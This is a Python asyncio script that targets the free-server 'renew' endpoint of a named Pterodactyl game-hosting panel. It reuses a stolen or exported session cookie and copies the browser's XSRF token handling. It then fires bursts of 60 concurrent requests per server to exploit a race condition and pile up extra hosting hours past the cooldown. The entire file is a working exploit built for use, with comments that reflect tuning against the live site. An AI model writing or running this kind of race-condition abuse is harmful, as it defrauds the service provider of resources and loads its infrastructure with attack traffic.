import aiohttp
import asyncio
import sys
import random
import os
import json
from urllib.parse import unquote

# === CONFIGURATION ===
BASE_URL = "https://gpanel.eternalzero.cloud"
RAW_COOKIE = os.environ.get("ETERNAL_COOKIE")

if not RAW_COOKIE:
    print("[!] FATAL: ETERNAL_COOKIE secret is missing.")
    sys.exit(1)

# === ATTACK SETTINGS ===
BURST_SIZE = 60
TIMEOUT = 15

# === COOKIE SETUP ===
# We initialize the jar with your session cookie.
# This mimics the browser already having the session logged in.
initial_cookies = {}
if "pterodactyl_session" not in RAW_COOKIE:
    initial_cookies['pterodactyl_session'] = RAW_COOKIE
else:
    # Handle case where user pasted full string "key=value; key2=value2"
    for item in RAW_COOKIE.split(';'):
        if '=' in item:
            k, v = item.strip().split('=', 1)
            initial_cookies[k.strip()] = v.strip()

# === HEADER FACTORY ===
def get_headers(session, referer=None):
    # Standard headers from your Command 2 output
    h = {
        'authority': 'gpanel.eternalzero.cloud',
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': BASE_URL,
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
    
    # CRITICAL: MIMIC BROWSER LOGIC
    # 1. Find the XSRF-TOKEN cookie in the jar
    # 2. Decode it (remove %3D etc)
    # 3. Set it as 'X-XSRF-TOKEN' header
    xsrf_val = None
    for cookie in session.cookie_jar:
        if cookie.key == 'XSRF-TOKEN':
            xsrf_val = unquote(cookie.value)
            break
            
    if xsrf_val:
        h['X-XSRF-TOKEN'] = xsrf_val
        # We explicitly do NOT set X-CSRF-TOKEN because your logs showed it as "MISSING"
    
    if referer:
        h['referer'] = referer
        
    return h

# === STEP 1: PRIME COOKIES ===
async def prime_cookies(session):
    print("[*] Priming cookies (visiting dashboard)...")
    try:
        # We visit the dashboard just to force the server to send us a fresh XSRF-TOKEN cookie
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        async with session.get(BASE_URL, headers=headers) as resp:
            await resp.text() # Consume body
            
            # Check if we got the cookie
            cookies = [c.key for c in session.cookie_jar]
            if 'XSRF-TOKEN' in cookies:
                print("[+] Cookie Jar Primed: XSRF-TOKEN acquired.")
                return True
            else:
                print("[!] Failed to get XSRF-TOKEN cookie. Session might be invalid.")
                return False
    except Exception as e:
        print(f"[!] Priming Error: {e}")
        return False

# === STEP 2: GET SERVER LIST ===
async def get_server_list(session):
    print("[*] Fetching server list...")
    try:
        # Pass session so get_headers can extract the token
        headers = get_headers(session)
        
        # DEBUG: Print headers to verify they match your browser logs
        if 'X-XSRF-TOKEN' not in headers:
            print("[!] FATAL: X-XSRF-TOKEN header missing. Logic failed.")
            return []

        async with session.get(f"{BASE_URL}/api/client", headers=headers) as resp:
            if resp.status == 200:
                data = await resp.json()
                servers = []
                for item in data['data']:
                    attr = item['attributes']
                    servers.append({
                        'name': attr['name'],
                        'uuid': attr['uuid'],
                        'short': attr['identifier']
                    })
                print(f"[+] Found {len(servers)} servers.")
                return servers
            else:
                print(f"[!] API Error {resp.status}: {await resp.text()}")
    except Exception as e:
        print(f"[!] List Error: {e}")
    return []

# === STEP 3: THE STORM ===
async def storm_server(session, server):
    target_url = f"{BASE_URL}/api/client/freeservers/{server['uuid']}/renew"
    print(f"\n[>>>] TARGET: {server['name']} ({server['short']})")
    
    headers = get_headers(session, referer=f"{BASE_URL}/server/{server['short']}")
    
    tasks = []
    for i in range(BURST_SIZE):
        tasks.append(fire_shot(session, target_url, headers))
    
    print(f"      FIRING {BURST_SIZE} REQUESTS...")
    results = await asyncio.gather(*tasks)
    
    hits = results.count(True)
    if hits > 0:
        print(f"[$$$] SUCCESS! Added +{hits * 4} Hours")
    else:
        print(f"[---] No Hits (Cooldown or Blocked)")

async def fire_shot(session, url, headers):
    try:
        async with session.post(url, json={}, headers=headers, params={'z': random.random()}) as resp:
            await resp.read()
            return resp.status in [200, 201]
    except:
        return False

# === MAIN ===
async def main():
    connector = aiohttp.TCPConnector(limit=0, force_close=True)
    async with aiohttp.ClientSession(cookies=initial_cookies, connector=connector) as session:
        
        if await prime_cookies(session):
            servers = await get_server_list(session)
            if servers:
                print("-" * 40)
                for server in servers:
                    await storm_server(session, server)
                    await asyncio.sleep(1) 
                print("-" * 40)
                print("[*] FLEET RENEWAL COMPLETE.")

if __name__ == "__main__":
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(main())
